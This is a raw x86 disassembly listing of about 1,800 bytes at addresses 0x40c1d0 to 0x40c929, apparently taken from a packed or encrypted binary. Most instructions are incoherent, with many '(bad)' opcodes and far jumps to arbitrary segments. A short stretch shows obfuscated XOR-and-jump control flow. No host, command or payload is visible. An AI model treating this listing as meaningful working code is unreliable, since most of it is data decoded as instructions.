  40c1d0:	sub    al,0x7c
  40c1d2:	jmp    0x9212:0xcaad87b6
  40c1d9:	inc    ebx
  40c1da:	inc    eax
  40c1db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c1dc:	adc    BYTE PTR [esi],ch
  40c1de:	imul   ebp,ebp,0x9c3f9035
  40c1e4:	(bad)  
  40c1e5:	(bad)  
  40c1e6:	rol    BYTE PTR [ebx+0x4b],cl
  40c1e9:	loop   0x40c24a
  40c1eb:	adc    DWORD PTR [edi],0xffffffa4
  40c1ee:	inc    esi
  40c1ef:	sar    DWORD PTR [eax],1
  40c1f1:	add    BYTE PTR [ebp+0x292dd585],dh
  40c1f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c1f8:	ror    ebp,1
  40c1fa:	jmp    0xaa414e
  40c1ff:	sbb    edi,DWORD PTR [ebx+0x288a728e]
  40c205:	pop    edi
  40c206:	push   esi
  40c207:	sub    DWORD PTR [eax],ecx
  40c209:	test   eax,0x91abc7e4
  40c20e:	mov    ds:0xdc382aca,al
  40c213:	or     eax,0x822563f7
  40c218:	or     BYTE PTR [edx+edi*1+0x63359f26],bl
  40c21f:	mov    ds:0x7ddabb6e,al
  40c224:	mov    ds:0xc38e5971,al
  40c229:	daa    
  40c22a:	cwde   
  40c22b:	mov    bl,0x86
  40c22d:	mov    ah,0x9e
  40c22f:	lods   eax,DWORD PTR ds:[esi]
  40c230:	mov    bh,0xee
  40c232:	test   al,0xb5
  40c234:	(bad)  
  40c235:	cmp    eax,0x7f3fb6c7
  40c23a:	jge    0x40c2b7
  40c23c:	neg    DWORD PTR [esi]
  40c23e:	pop    edi
  40c23f:	sub    al,0x7a
  40c241:	(bad)  
  40c242:	mov    esp,0x11b5a316
  40c247:	sub    BYTE PTR [eax],cl
  40c249:	pop    ss
  40c24a:	or     edi,ecx
  40c24c:	cld    
  40c24d:	push   es
  40c24e:	xor    al,0x57
  40c250:	shl    BYTE PTR [ebx+0x78],0x40
  40c254:	xor    dl,BYTE PTR [eax-0x6a]
  40c257:	sub    al,0xe
  40c259:	pop    eax
  40c25a:	mov    DWORD PTR [esi-0x101806b4],edi
  40c260:	scas   al,BYTE PTR es:[edi]
  40c261:	push   cs
  40c262:	test   BYTE PTR [edx+0x79],ch
  40c265:	inc    edx
  40c266:	push   edi
  40c267:	inc    ebp
  40c268:	sbb    eax,0x6ce8e25e
  40c26d:	ja     0x40c20b
  40c26f:	jl     0x40c225
  40c271:	(bad)  
  40c273:	sbb    esi,DWORD PTR [ecx+0x641e5bc4]
  40c279:	fdiv   st,st(1)
  40c27b:	mov    bh,0x2d
  40c27d:	sub    bl,bh
  40c27f:	sbb    eax,0x465d01f7
  40c284:	int    0xbb
  40c286:	repnz xchg ch,ch
  40c289:	adc    esp,DWORD PTR [ecx-0x20fb9fe6]
  40c28f:	mov    al,ds:0xb699bce0
  40c294:	adc    eax,0xae9d7d1b
  40c299:	adc    DWORD PTR [edx-0x55],esi
  40c29c:	xor    ebp,DWORD PTR [ebx]
  40c29e:	ds cmp eax,0x504fec76
  40c2a4:	push   0x7e3d6893
  40c2a9:	ds dec ebp
  40c2ab:	add    esp,ebp
  40c2ad:	fnsave [esi+0x56]
  40c2b0:	mov    edi,ebx
  40c2b2:	out    dx,al
  40c2b3:	rcr    BYTE PTR [esp+edx*4+0x5d],0xaa
  40c2b8:	in     eax,0x37
  40c2ba:	mov    bl,0xfe
  40c2bc:	inc    ebp
  40c2bd:	mov    edx,0x86064ad2
  40c2c2:	call   0x6301:0xb2af91c4
  40c2c9:	cli    
  40c2ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c2cb:	sub    ch,bh
  40c2cd:	addr16 lock imul edi,ecx,0x8ec5e864
  40c2d5:	inc    edi
  40c2d6:	popf   
  40c2d7:	sbb    DWORD PTR [ebp-0x379a5d55],esi
  40c2dd:	mov    cl,0x59
  40c2df:	nop
  40c2e0:	xchg   BYTE PTR [eax+0x11cfb743],cl
  40c2e6:	jl     0x40c26e
  40c2e8:	inc    ebp
  40c2e9:	cmp    eax,edx
  40c2eb:	test   dl,ah
  40c2ed:	pop    es
  40c2ee:	jno    0x40c2be
  40c2f0:	test   eax,0xb32226b1
  40c2f5:	jmp    0x40c29a
  40c2f7:	xor    DWORD PTR [esp+ebx*4+0x47e859eb],0x741ec2c2
  40c302:	cmp    al,0x23
  40c304:	loopne 0x40c2b0
  40c306:	jb     0x40c2e4
  40c308:	pop    ss
  40c309:	test   DWORD PTR [ebp+eiz*8+0x3f49050a],edi
  40c310:	out    0x77,eax
  40c312:	test   al,0x7
  40c314:	mov    ebp,0xa8b8fb40
  40c319:	test   eax,0xe31add53
  40c31e:	test   ch,bl
  40c320:	cmp    al,0xaf
  40c322:	ja     0x40c356
  40c324:	sbb    edi,ebx
  40c326:	adc    eax,0x47ff1d2c
  40c32b:	push   esi
  40c32c:	mov    ds:0xe6abee25,eax
  40c331:	paddd  mm0,QWORD PTR [ebp+0x4ecef306]
  40c338:	inc    esi
  40c339:	in     al,0x5f
  40c33b:	loop   0x40c351
  40c33d:	mov    esi,0x6ec9053e
  40c342:	xchg   esp,eax
  40c343:	jp     0x40c3b1
  40c345:	test   eax,0xb7dd1171
  40c34a:	mov    ss,WORD PTR [eax+0xd]
  40c34d:	lock (bad) 
  40c350:	hlt    
  40c351:	push   ebx
  40c352:	(bad)  
  40c354:	outs   dx,DWORD PTR ds:[esi]
  40c355:	(bad)  
  40c356:	stc    
  40c357:	icebp  
  40c358:	in     eax,0xdc
  40c35a:	bsf    esi,DWORD PTR ds:0xff96a7e7
  40c361:	cs retf 0xd917
  40c365:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c366:	mov    ecx,0x532128b7
  40c36b:	cld    
  40c36c:	imul   eax,DWORD PTR [ebx],0x87419441
  40c372:	(bad)  
  40c373:	pushf  
  40c374:	pop    ecx
  40c375:	xchg   edi,eax
  40c376:	xchg   ebx,eax
  40c377:	and    dl,bl
  40c379:	shl    ah,0x33
  40c37c:	in     eax,dx
  40c37d:	jle    0x40c3fc
  40c37f:	aas    
  40c380:	sar    BYTE PTR [edi],1
  40c382:	sub    eax,0x3deb0065
  40c387:	stos   DWORD PTR es:[edi],eax
  40c388:	jge    0x40c3e8
  40c38a:	jmp    0x40c370
  40c38c:	fsub   QWORD PTR [eax-0x2ad0ee58]
  40c392:	arpl   bx,ax
  40c394:	cmc    
  40c395:	popa   
  40c396:	int    0x75
  40c398:	xchg   esp,ebp
  40c39a:	pop    edx
  40c39b:	pop    ds
  40c39c:	cli    
  40c39d:	scas   al,BYTE PTR es:[edi]
  40c39e:	pop    ebp
  40c39f:	in     eax,0xd
  40c3a1:	mov    bh,0x76
  40c3a3:	inc    esi
  40c3a4:	push   0x4498df44
  40c3a9:	xchg   esp,eax
  40c3aa:	mov    cl,0x75
  40c3ac:	mov    al,0xb0
  40c3ae:	in     al,0xb
  40c3b0:	popf   
  40c3b1:	and    al,BYTE PTR [ebp-0x640afeef]
  40c3b7:	fisubr DWORD PTR [esi+0x7c]
  40c3ba:	add    al,0x10
  40c3bc:	cmp    dl,cl
  40c3be:	push   0xefa071cc
  40c3c3:	dec    esp
  40c3c4:	push   eax
  40c3c5:	adc    ah,dh
  40c3c7:	pop    es
  40c3c8:	je     0x40c375
  40c3ca:	pusha  
  40c3cb:	(bad)  
  40c3cc:	xchg   ebp,eax
  40c3cd:	fcmovu st,st(4)
  40c3cf:	sbb    cl,BYTE PTR [eax-0x54]
  40c3d2:	add    DWORD PTR [edx],ebx
  40c3d4:	jbe    0x40c3fa
  40c3d6:	sbb    BYTE PTR [ecx],bh
  40c3d8:	shl    BYTE PTR [bx+di],0x97
  40c3dc:	or     al,0xf9
  40c3de:	call   0xcdcbfd6b
  40c3e3:	imul   ebp,ebx,0xffffffb8
  40c3e6:	sbb    ebp,ebx
  40c3e8:	int    0x47
  40c3ea:	jb     0x40c44b
  40c3ec:	jmp    0x40c385
  40c3ee:	inc    ecx
  40c3ef:	jnp    0x40c3c2
  40c3f1:	mov    esp,0x9db2338b
  40c3f6:	jle    0x40c422
  40c3f8:	shr    DWORD PTR [ecx+ebx*4-0x63],1
  40c3fc:	sub    BYTE PTR [ecx+0xb],bl
  40c3ff:	ins    DWORD PTR es:[edi],dx
  40c400:	jge    0x40c45f
  40c402:	into   
  40c403:	sub    ah,cl
  40c405:	daa    
  40c406:	mov    edi,0x9b24037f
  40c40b:	fstp   st(4)
  40c40d:	sbb    al,0x25
  40c40f:	pop    es
  40c410:	icebp  
  40c411:	adc    DWORD PTR [esi+0x1c],eax
  40c414:	jo     0x40c430
  40c416:	sbb    DWORD PTR [ebp+eiz*2+0x7ffb6541],ebp
  40c41d:	test   DWORD PTR [esi-0x7c],eax
  40c420:	jge    0x40c419
  40c422:	dec    esp
  40c423:	stc    
  40c424:	cmp    DWORD PTR [esi-0x484ade52],0xfffffff7
  40c42b:	pop    es
  40c42c:	sub    BYTE PTR [edx+edi*2-0x1b],al
  40c430:	mov    ds:0x4eb0e5ae,eax
  40c435:	in     al,dx
  40c436:	cmc    
  40c437:	mov    esp,ecx
  40c439:	in     al,dx
  40c43a:	xchg   ebx,eax
  40c43b:	out    dx,eax
  40c43c:	stos   DWORD PTR es:[edi],eax
  40c43d:	mov    dh,0x9b
  40c43f:	call   0x1881fe1b
  40c444:	in     al,0xf0
  40c446:	ins    BYTE PTR es:[edi],dx
  40c447:	stc    
  40c448:	into   
  40c449:	push   ebp
  40c44a:	dec    edi
  40c44b:	add    cl,dh
  40c44d:	jnp    0x40c3d6
  40c44f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c450:	pop    edi
  40c451:	call   0x52ef:0x3b8acafc
  40c458:	push   esi
  40c459:	popf   
  40c45a:	shl    BYTE PTR [ebx],1
  40c45c:	inc    edi
  40c45d:	pop    edi
  40c45e:	push   eax
  40c45f:	cmp    DWORD PTR [esp+ecx*8],esp
  40c462:	cmp    DWORD PTR [edx+ebp*2],esi
  40c465:	sub    eax,0xc449e109
  40c46a:	pop    ecx
  40c46b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c46c:	(bad)  
  40c46d:	outs   dx,BYTE PTR ds:[esi]
  40c46e:	mov    al,0x70
  40c470:	cli    
  40c471:	arpl   WORD PTR [ecx+0x66],sp
  40c474:	fsubr  DWORD PTR [esi+eax*1]
  40c477:	sub    BYTE PTR [ebx],0xec
  40c47a:	lds    esp,FWORD PTR gs:[edi]
  40c47d:	push   edx
  40c47e:	and    BYTE PTR [ecx],0xe6
  40c481:	in     al,dx
  40c482:	or     BYTE PTR [ebp+0x15ecfb47],cl
  40c488:	sub    DWORD PTR [ecx],0x663ebcde
  40c48e:	nop
  40c48f:	enter  0x804a,0x3f
  40c493:	sub    BYTE PTR [ebx+ebx*1-0x4d9a3519],ah
  40c49a:	inc    ebp
  40c49b:	ret    0x912a
  40c49e:	cmp    BYTE PTR [esi],dh
  40c4a0:	stos   DWORD PTR es:[edi],eax
  40c4a1:	aas    
  40c4a2:	inc    esi
  40c4a3:	(bad)  
  40c4a4:	ss retf 0x264a
  40c4a8:	xchg   edx,eax
  40c4a9:	and    BYTE PTR [ebx+0x71],cl
  40c4ac:	pop    ss
  40c4ad:	lahf   
  40c4ae:	clc    
  40c4af:	mov    ah,0x44
  40c4b1:	loop   0x40c45a
  40c4b3:	in     eax,0xe3
  40c4b5:	sub    dl,BYTE PTR [esi-0x4b88f723]
  40c4bb:	xor    bh,ah
  40c4bd:	fwait
  40c4be:	or     dh,bh
  40c4c0:	pop    ecx
  40c4c1:	push   edi
  40c4c2:	pop    ebx
  40c4c3:	mov    ah,0x68
  40c4c5:	dec    ebp
  40c4c6:	out    0xcf,eax
  40c4c8:	and    eax,0x337dabb2
  40c4cd:	sti    
  40c4ce:	or     al,0xc6
  40c4d0:	fiadd  DWORD PTR [ecx]
  40c4d2:	and    BYTE PTR [eax],ch
  40c4d4:	xchg   ecx,eax
  40c4d5:	push   ss
  40c4d6:	push   cs
  40c4d7:	ror    DWORD PTR [edi-0x3f],1
  40c4da:	sub    ecx,DWORD PTR [eax]
  40c4dc:	cmp    al,0xc2
  40c4de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c4df:	sbb    DWORD PTR [edi-0x2],0x7a403086
  40c4e6:	jmp    0x40c492
  40c4e8:	cmc    
  40c4e9:	pop    DWORD PTR [ecx-0x20]
  40c4ec:	hlt    
  40c4ed:	add    eax,0xb346b314
  40c4f2:	in     eax,dx
  40c4f3:	imul   edx,edi
  40c4f6:	mov    DWORD PTR [ebp+0xc],edx
  40c4f9:	mov    edx,DWORD PTR [ebp+0xc]
  40c4fc:	mov    DWORD PTR [ebp-0x24],edx
  40c4ff:	mov    edx,DWORD PTR [ebp-0x8]
  40c502:	add    edx,DWORD PTR [ebp-0x40]
  40c505:	mov    DWORD PTR [ebp-0x18],0xf89c8536
  40c50c:	mov    DWORD PTR [ebp-0x1c],edx
  40c50f:	mov    DWORD PTR [ebp-0xc],0xf89c8539
  40c516:	mov    DWORD PTR [ebp-0x44],0xf89c8538
  40c51d:	mov    edx,DWORD PTR [ebp-0x18]
  40c520:	xor    edx,eax
  40c522:	add    edx,ecx
  40c524:	jmp    0x40cdbf
  40c529:	mov    edx,DWORD PTR [ebp-0x18]
  40c52c:	xor    edx,eax
  40c52e:	jmp    0x40c945
  40c533:	sub    al,0x9b
  40c535:	inc    edx
  40c536:	(bad)  
  40c537:	dec    ebp
  40c538:	idiv   DWORD PTR [ebp+esi*2-0x2cf58fc4]
  40c53f:	bt     edx,edx
  40c542:	mov    al,0xd0
  40c544:	xchg   esi,eax
  40c545:	jle    0x40c5c5
  40c547:	jo     0x40c5c2
  40c549:	jle    0x40c5c9
  40c54b:	fsub   QWORD PTR [ecx+0x59]
  40c54e:	xchg   ecx,eax
  40c54f:	push   ebp
  40c550:	(bad)  
  40c551:	push   edx
  40c552:	pop    es
  40c553:	cwde   
  40c554:	mov    bl,0xdd
  40c556:	add    BYTE PTR [ebx+0x6],dh
  40c559:	cmp    BYTE PTR [eax],0xf5
  40c55c:	shl    BYTE PTR [ecx+0x2bac56e3],cl
  40c562:	push   0xd7a96a
  40c567:	fs (bad) 
  40c569:	in     eax,dx
  40c56a:	adc    DWORD PTR [esi],edx
  40c56c:	pop    ecx
  40c56d:	rcl    DWORD PTR [ebp-0x53],1
  40c570:	test   eax,0x5c7668cd
  40c575:	xor    BYTE PTR [ecx-0x61],bl
  40c578:	dec    ebp
  40c579:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c57a:	inc    edi
  40c57b:	cmp    bh,cl
  40c57d:	loop   0x40c53e
  40c57f:	in     eax,0x94
  40c581:	dec    eax
  40c582:	fdivr  DWORD PTR [edi]
  40c584:	cdq    
  40c585:	xor    DWORD PTR [eax],ebx
  40c587:	mov    BYTE PTR [esi-0x1f],bl
  40c58a:	sub    BYTE PTR [edi-0x713d5273],0x81
  40c591:	js     0x40c57b
  40c593:	pop    ecx
  40c594:	ss pop ecx
  40c596:	icebp  
  40c597:	retf   
  40c598:	das    
  40c599:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c59a:	xchg   ebx,eax
  40c59b:	lds    eax,FWORD PTR [edx]
  40c59d:	je     0x40c524
  40c59f:	fwait
  40c5a0:	fwait
  40c5a1:	jo     0xe64d2b67
  40c5a7:	adc    al,bl
  40c5a9:	arpl   WORD PTR [eax],cx
  40c5ab:	lock adc eax,0x4667ce2c
  40c5b1:	ss xchg dl,ch
  40c5b4:	inc    ebp
  40c5b5:	test   eax,0x4ced0f91
  40c5ba:	push   0xffffff92
  40c5bc:	mov    ds:0xcdbe19ac,eax
  40c5c1:	shr    esp,cl
  40c5c3:	enter  0xf52d,0x4c
  40c5c7:	sub    ch,0x37
  40c5ca:	xlat   BYTE PTR ds:[ebx]
  40c5cb:	pusha  
  40c5cc:	out    dx,al
  40c5cd:	mov    bh,0xff
  40c5cf:	std    
  40c5d0:	in     al,dx
  40c5d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c5d2:	cld    
  40c5d3:	stos   DWORD PTR es:[edi],eax
  40c5d4:	push   edx
  40c5d5:	add    edi,DWORD PTR [edx+0x4c]
  40c5d8:	punpckhdq mm0,QWORD PTR [esi]
  40c5db:	outs   dx,BYTE PTR ds:[esi]
  40c5dc:	and    BYTE PTR [ecx+edi*2+0x1f7fa0d7],al
  40c5e3:	xor    dl,BYTE PTR [ebx]
  40c5e5:	sub    al,0xc3
  40c5e7:	dec    ecx
  40c5e8:	jae    0x40c653
  40c5ea:	jb     0x40c5a5
  40c5ec:	sbb    edx,esp
  40c5ee:	xchg   ecx,eax
  40c5ef:	mov    ah,0xbb
  40c5f1:	mov    edx,0x22dc74c2
  40c5f6:	push   ebp
  40c5f7:	adc    esi,DWORD PTR [ebp-0x8]
  40c5fa:	adc    eax,0xa8ef30ed
  40c5ff:	adc    DWORD PTR [ebx-0x20c91566],ebp
  40c605:	in     al,0xe0
  40c607:	js     0x40c5e0
  40c609:	js     0x40c612
  40c60b:	xchg   ecx,eax
  40c60c:	call   0x96e3:0xbf5a6582
  40c613:	push   ds
  40c614:	dec    esp
  40c615:	mov    dl,0xf
  40c617:	into   
  40c618:	cmp    BYTE PTR [ecx],bh
  40c61a:	and    eax,0x2fc28780
  40c61f:	and    esi,DWORD PTR ds:0xae2c04a
  40c625:	and    DWORD PTR [ecx],esi
  40c627:	cmp    ebp,esi
  40c629:	xor    BYTE PTR [ebx],ch
  40c62b:	xchg   esi,eax
  40c62c:	or     eax,0x2c4d32e0
  40c631:	jo     0x40c61c
  40c633:	pop    ds
  40c634:	mov    esi,0x4d6be74a
  40c639:	cmc    
  40c63a:	xor    edi,ecx
  40c63c:	dec    ecx
  40c63d:	popa   
  40c63e:	retf   0xe532
  40c641:	imul   edx,edi,0x61
  40c644:	call   0xb400:0xda8e9b4c
  40c64b:	sub    al,0x77
  40c64d:	rcl    BYTE PTR [eax+0x73],cl
  40c650:	ret    
  40c651:	xlat   BYTE PTR ds:[ebx]
  40c652:	loope  0x40c603
  40c654:	add    dl,bh
  40c656:	mov    ds:0xa0cffdba,al
  40c65b:	mov    esi,0x906da7aa
  40c660:	icebp  
  40c661:	pop    DWORD PTR ds:0x4d56011c
  40c667:	or     al,0xaa
  40c669:	xchg   ebp,eax
  40c66a:	jbe    0x40c69e
  40c66c:	ficom  WORD PTR [edi+eiz*1-0x2f4bcec2]
  40c673:	mov    al,ds:0xe0969885
  40c678:	icebp  
  40c679:	dec    ecx
  40c67a:	jmp    0xdaa3d1c5
  40c67f:	fnstsw WORD PTR [eax-0x7b372132]
  40c685:	sub    al,0x64
  40c687:	ror    BYTE PTR [esi],0x7b
  40c68a:	jmp    0x40c616
  40c68c:	inc    ebx
  40c68d:	xchg   ebx,eax
  40c68e:	mov    ebp,0x2adf9a79
  40c693:	sahf   
  40c694:	pushf  
  40c695:	sbb    DWORD PTR [eax],ebx
  40c697:	pop    ds
  40c698:	rol    BYTE PTR [ebp+0x6f],1
  40c69b:	mov    ecx,0x939d7740
  40c6a0:	push   esp
  40c6a1:	fnstcw WORD PTR [edx+edx*1]
  40c6a4:	xchg   BYTE PTR [ecx-0x7023196d],cl
  40c6aa:	test   BYTE PTR [ebx],cl
  40c6ac:	push   0xffffff91
  40c6ae:	fimul  WORD PTR [esp+ebp*4-0x35]
  40c6b2:	(bad)  
  40c6b3:	fidivr DWORD PTR [edx+esi*1-0x3c]
  40c6b7:	push   ebx
  40c6b8:	jmp    0xe45c:0xfb298bec
  40c6bf:	retf   0xa0a3
  40c6c2:	lds    eax,FWORD PTR [ebx+0x6c573077]
  40c6c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c6c9:	xor    DWORD PTR [ecx],ebp
  40c6cb:	or     bl,BYTE PTR [esi-0x37]
  40c6ce:	jp     0x40c6d4
  40c6d0:	mov    ah,0xc7
  40c6d2:	adc    ch,bl
  40c6d4:	dec    esp
  40c6d5:	daa    
  40c6d6:	xor    ebp,DWORD PTR [ebx+0x2]
  40c6d9:	adc    dh,BYTE PTR [eax]
  40c6db:	dec    edi
  40c6dc:	iret   
  40c6dd:	(bad)  
  40c6de:	das    
  40c6df:	int3   
  40c6e0:	fs je  0x40c6d9
  40c6e3:	ins    BYTE PTR es:[edi],dx
  40c6e4:	inc    edx
  40c6e5:	sahf   
  40c6e6:	adc    al,bl
  40c6e8:	push   ebx
  40c6e9:	jg     0x40c6ba
  40c6eb:	iret   
  40c6ec:	hlt    
  40c6ed:	push   esi
  40c6ee:	jmp    0xa1dc:0x58211192
  40c6f5:	pop    eax
  40c6f6:	sbb    DWORD PTR [ecx-0x472770aa],esp
  40c6fc:	(bad)  
  40c6fd:	repz sub eax,ebx
  40c700:	std    
  40c701:	xchg   esp,eax
  40c702:	pop    es
  40c703:	mul    BYTE PTR [ebx+ebx*1]
  40c706:	int3   
  40c707:	out    0x59,eax
  40c709:	fcomip st,st(4)
  40c70b:	scas   al,BYTE PTR es:[edi]
  40c70c:	je     0x40c6d3
  40c70e:	mov    cl,0xde
  40c710:	xchg   edx,eax
  40c711:	not    DWORD PTR cs:[edi]
  40c714:	mov    dh,BYTE PTR [eax]
  40c716:	adc    edi,DWORD PTR [ecx-0x5331ea4b]
  40c71c:	retf   
  40c71d:	outs   dx,BYTE PTR ds:[esi]
  40c71e:	(bad)  
  40c71f:	std    
  40c720:	or     eax,0xffffff82
  40c723:	loop   0x40c744
  40c725:	cmp    DWORD PTR [ebx-0x5d],eax
  40c728:	pusha  
  40c729:	rcl    DWORD PTR ds:0x54d8f4f3,cl
  40c72f:	aad    0xb6
  40c731:	jbe    0x40c77c
  40c733:	ins    DWORD PTR es:[edi],dx
  40c734:	pop    esp
  40c735:	jge    0x40c6cf
  40c737:	cs adc esi,edi
  40c73a:	jne    0x40c6e3
  40c73c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c73d:	inc    ecx
  40c73e:	push   edi
  40c73f:	add    BYTE PTR [ecx-0x60],0x80
  40c743:	ds jle 0x40c6e2
  40c746:	fdivr  st,st(7)
  40c748:	xor    BYTE PTR [ebx+ecx*8-0x69],bl
  40c74c:	xor    al,0xfd
  40c74e:	imul   edi,edx,0x73
  40c751:	or     al,BYTE PTR [ecx+0x5e]
  40c754:	inc    edx
  40c755:	arpl   ax,bx
  40c757:	pop    es
  40c758:	int    0x78
  40c75a:	sub    eax,0xffee365d
  40c75f:	call   0xee68c3ce
  40c764:	push   eax
  40c765:	test   al,0xfc
  40c767:	add    edi,DWORD PTR [eax-0x7e28c0f6]
  40c76d:	cmp    al,0xd7
  40c76f:	sub    DWORD PTR [edi+eax*8],ebp
  40c772:	push   edi
  40c773:	bound  ebp,QWORD PTR [edx]
  40c775:	rol    BYTE PTR [ecx-0x22],cl
  40c778:	fsub   DWORD PTR [eax-0x28cd248b]
  40c77e:	int3   
  40c77f:	into   
  40c780:	mov    edx,0xe27815d6
  40c785:	not    BYTE PTR [esi-0x43]
  40c788:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c789:	cmc    
  40c78a:	pop    ss
  40c78b:	aam    0x25
  40c78d:	mov    dl,BYTE PTR [ebx-0x29dde34e]
  40c793:	jmp    0xbc3f:0x6a81749c
  40c79a:	loop   0x40c79f
  40c79c:	popf   
  40c79d:	pushf  
  40c79e:	scas   al,BYTE PTR es:[edi]
  40c79f:	sbb    BYTE PTR [ecx-0x5a106657],cl
  40c7a5:	push   0x8ba024dd
  40c7aa:	cmp    esp,DWORD PTR [esi+0x3b]
  40c7ad:	sbb    DWORD PTR [ebx],0xffffff9b
  40c7b0:	(bad)  
  40c7b1:	sub    bl,dh
  40c7b3:	enter  0x1997,0xaf
  40c7b7:	xor    eax,ecx
  40c7b9:	cmp    eax,0x8e8928cf
  40c7be:	sub    DWORD PTR [ebx],ebx
  40c7c0:	(bad)  
  40c7c1:	loope  0x40c7f0
  40c7c3:	(bad)  
  40c7c4:	stc    
  40c7c5:	gs cwde 
  40c7c7:	mov    cs,edx
  40c7c9:	dec    ebp
  40c7ca:	ss stos DWORD PTR es:[edi],eax
  40c7cc:	loop   0x40c7b0
  40c7ce:	dec    ebx
  40c7cf:	jo     0x40c785
  40c7d1:	dec    eax
  40c7d2:	int3   
  40c7d3:	test   BYTE PTR [ebx+0x45],0xe0
  40c7d7:	xchg   BYTE PTR [edi+0x2d541840],dh
  40c7dd:	rol    DWORD PTR [ecx-0x18],0x68
  40c7e1:	mov    eax,ds:0xe98d0331
  40c7e6:	push   ebp
  40c7e7:	adc    ecx,edi
  40c7e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c7ea:	es pop ebp
  40c7ec:	inc    ecx
  40c7ed:	mov    edi,0x7b1b9108
  40c7f2:	faddp  st(0),st
  40c7f4:	cmp    al,0xc7
  40c7f6:	ss pop ebp
  40c7f8:	(bad)  
  40c7f9:	adc    DWORD PTR [ebp-0x246014b4],edx
  40c7ff:	es jge 0x40c86c
  40c802:	int3   
  40c803:	stos   BYTE PTR es:[edi],al
  40c804:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c805:	sbb    dh,ah
  40c807:	inc    edi
  40c808:	out    dx,eax
  40c809:	mov    cl,0x11
  40c80b:	shr    BYTE PTR [edx*4+0x2fcebf55],cl
  40c812:	add    eax,0x457f2da2
  40c817:	xor    al,0x7c
  40c819:	mov    ds:0x30bf746d,al
  40c81e:	hlt    
  40c81f:	ins    DWORD PTR es:[edi],dx
  40c820:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c821:	sbb    al,0x89
  40c823:	call   0x9a51:0x4d448dc9
  40c82a:	push   eax
  40c82b:	mov    dh,BYTE PTR [eax-0x17]
  40c82e:	dec    esp
  40c82f:	push   ds
  40c830:	mov    edx,0x934a9829
  40c835:	adc    al,0x5d
  40c837:	pop    ebp
  40c838:	popf   
  40c839:	loopne 0x40c88d
  40c83b:	sbb    bl,dl
  40c83d:	xor    eax,0x6d6af150
  40c842:	xchg   ecx,eax
  40c843:	cmc    
  40c844:	jbe    0x40c7f1
  40c846:	je     0x40c87a
  40c848:	shl    DWORD PTR [eax+0x28944298],cl
  40c84e:	mov    gs,WORD PTR [edi]
  40c850:	sahf   
  40c851:	pop    ds
  40c852:	and    cl,BYTE PTR [ecx+0x24dfcede]
  40c858:	daa    
  40c859:	in     al,0x61
  40c85b:	fidivr WORD PTR [edx-0x5b89c165]
  40c861:	inc    esi
  40c862:	out    0xae,eax
  40c864:	add    al,0x61
  40c866:	test   DWORD PTR [eax-0x1d],ecx
  40c869:	mov    cl,0x36
  40c86b:	xchg   esp,eax
  40c86c:	sub    BYTE PTR [esi+ecx*4],al
  40c86f:	mov    edi,ss
  40c871:	jns    0x40c81c
  40c873:	push   eax
  40c874:	adc    al,0x76
  40c876:	pop    ebp
  40c877:	shl    BYTE PTR [ebx+0x7c],0x2d
  40c87b:	inc    ebp
  40c87c:	mov    ecx,0xfe28335b
  40c881:	(bad)  
  40c882:	fisub  DWORD PTR [ecx-0x41a9cce]
  40c888:	xor    eax,0xbf27db89
  40c88d:	(bad)  
  40c88e:	jbe    0x40c881
  40c890:	dec    esi
  40c891:	test   DWORD PTR [edx+0x68],ebp
  40c894:	fist   WORD PTR [ebx+0x1c]
  40c897:	std    
  40c898:	(bad)  
  40c899:	rcr    DWORD PTR [edi-0x1ef9d596],1
  40c89f:	out    dx,al
  40c8a0:	push   es
  40c8a1:	add    BYTE PTR [ebp+0x1f],dl
  40c8a4:	jbe    0x40c91a
  40c8a6:	pop    es
  40c8a7:	and    dh,BYTE PTR [edx+0x47]
  40c8aa:	pop    ebx
  40c8ab:	ins    BYTE PTR es:[edi],dx
  40c8ac:	adc    eax,DWORD PTR [edx]
  40c8ae:	syscall 
  40c8b0:	push   esp
  40c8b1:	inc    eax
  40c8b2:	daa    
  40c8b3:	xor    esp,DWORD PTR [edx+0x481aaca3]
  40c8b9:	call   0xd1e6fbfe
  40c8be:	retw   0x1b02
  40c8c2:	es push ebx
  40c8c4:	in     al,dx
  40c8c5:	(bad)  
  40c8c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c8c7:	in     eax,dx
  40c8c8:	adc    BYTE PTR [esi+0x6feb7da9],0xe8
  40c8cf:	cdq    
  40c8d0:	push   esp
  40c8d1:	mov    eax,ds:0x5df18b56
  40c8d6:	cmp    DWORD PTR [edx+0x6023cbbf],ebp
  40c8dc:	mov    bl,0x29
  40c8de:	mov    esi,0x8295513b
  40c8e3:	xchg   edx,eax
  40c8e4:	xchg   ebp,eax
  40c8e5:	out    dx,al
  40c8e6:	in     al,dx
  40c8e7:	adc    DWORD PTR [ebp+0x35e7886d],edi
  40c8ed:	sahf   
  40c8ee:	test   DWORD PTR [ecx-0x42f937c3],0xfdf5f0aa
  40c8f8:	in     eax,dx
  40c8f9:	mov    ecx,0x76200fb3
  40c8fe:	clc    
  40c8ff:	in     al,dx
  40c900:	(bad)  
  40c901:	shl    eax,cl
  40c903:	mov    ds:0x29eed5cc,al
  40c908:	push   esp
  40c909:	pop    dx
  40c90b:	les    ecx,FWORD PTR [ecx-0x3c9c1f9]
  40c911:	aam    0xad
  40c913:	push   edi
  40c914:	dec    ecx
  40c915:	sbb    ah,BYTE PTR gs:[ebx-0x63]
  40c919:	test   BYTE PTR [ecx+eax*8-0x6035edd0],0x68
  40c921:	inc    edi
  40c922:	fisttp QWORD PTR [ebp-0x59]
  40c925:	dec    esi
  40c926:	xor    edi,DWORD PTR [ecx+0x44]
  40c929:	sub    al,0x7e
